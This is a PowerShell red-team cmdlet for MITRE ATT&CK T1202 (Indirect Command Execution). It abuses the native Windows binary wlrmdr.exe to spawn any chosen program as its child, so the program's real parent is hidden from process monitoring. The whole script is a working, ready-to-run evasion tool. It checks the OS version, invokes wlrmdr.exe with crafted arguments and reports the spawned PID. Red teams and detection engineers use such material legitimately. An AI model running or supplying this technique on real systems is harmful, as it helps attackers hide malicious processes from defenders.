<#
.SYNOPSIS
   [MITRE T1202] Indirect Command Execution.

   Author: @r00t-3xp10it
   Disclosure by: @0gtweet
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: wlrmdr.exe {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   This cmdlet allow users to spawn processes
   with wlrmdr.exe (LOLBIN) as parent process.

.NOTES
   Privileges required: UserLand
   Vulnerable: Windows 10, Windows 11

.Parameter Binary
   The child process to spawn (default: calc.exe)

.Parameter DelayExec
   The delay time of child execution (default: 0)

.EXAMPLE
   PS C:\> .\Mitre-T1202.ps1 -Binary "mspaint.exe" -DelayExec "1000"
   Spawn 'mspaint.exe' with 'wlrmdr.exe' as parent process.

.OUTPUTS
   * MITRE ATT&CK T1202: Indirect Command Execution.
   * Exec 'mspaint.exe' with wlrmdr.exe as parent process.
   * Successful executed: 'mspaint.exe' with PID: '2544'

.LINK
   https://lolbas-project.github.io/lolbas/Binaries/Wlrmdr
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Binary="calc.exe",
   [int]$DelayExec='100'
)


$CmdletVersion = "v1.0.2"
#Global variable declarations
#$ErrorActionPreference = "SilentlyContinue"
$HostDistro = [System.Environment]::OSVersion.Version.Major
$host.UI.RawUI.WindowTitle = "@T1202 $CmdletVersion {SSA@RedTeam}"
write-host "`n* MITRE ATT&CK T1202: Indirect Command Execution." -ForegroundColor Green
Start-Sleep -Seconds 1

#Make sure all dependencies are meet
If($HostDistro -NotMatch '^(10|11)$')
{   
   Write-Host "x " -ForegroundColor Red -NoNewline
   Write-Host "Error: Windows [" -ForegroundColor DarkGray -NoNewline
   Write-Host "$HostDistro" -ForegroundColor Red -NoNewline
   Write-Host "] version not supported.`n" -ForegroundColor Red 
   return
}

If(-not(Test-Path -Path "$Env:WINDIR\System32\wlrmdr.exe"))
{
   Write-Host "x " -ForegroundColor Red -NoNewline
   Write-Host "Error: " -ForegroundColor DarkGray -NoNewline
   Write-Host "$($Error[0])`n" -ForegroundColor Red
   return
}

write-host "* " -ForegroundColor Green -NoNewline
write-host "Exec '" -ForegroundColor DarkGray -NoNewline
write-host "$Binary" -ForegroundColor DarkYellow -NoNewline
write-host "' with '" -ForegroundColor DarkGray -NoNewline
write-host "wlrmdr" -ForegroundColor Green -NoNewline
write-host "' as parent process." -ForegroundColor DarkGray

Try{#Execute calc.exe with wlrmdr.exe as parent process
   wlrmdr.exe -s $DelayExec -f 0 -t 0 -m 0 -a 11 -u "$Binary"
}Catch{
   Write-Host "x " -ForegroundColor Red -NoNewline
   Write-Host "Error: " -ForegroundColor DarkGray -NoNewline
   Write-Host "$($Error[0])`n" -ForegroundColor Red
   Return
}


If($Binary -Match '(.exe)$')
{
   $RawBinary = $Binary -replace '(.exe)$',''
}

$NewTimer = [int]$DelayExec+1300
Start-Sleep -Milliseconds $NewTimer
#Check if inputed process name is running..
If((Get-Process -Name "$RawBinary"|Select *).Responding -Match 'True')
{
   $PPId = (Get-Process -Name "$RawBinary"|Select-Object *).Id|Select-Object -Last 1
   write-host "* Successful executed: '" -ForegroundColor Green -NoNewline
   write-host "$Binary" -ForegroundColor DarkYellow -NoNewline
   write-host "' with PID: '" -ForegroundColor Green -NoNewline
   write-host "$PPId" -ForegroundColor DarkYellow -NoNewline
   write-host "'`n" -ForegroundColor Green
}
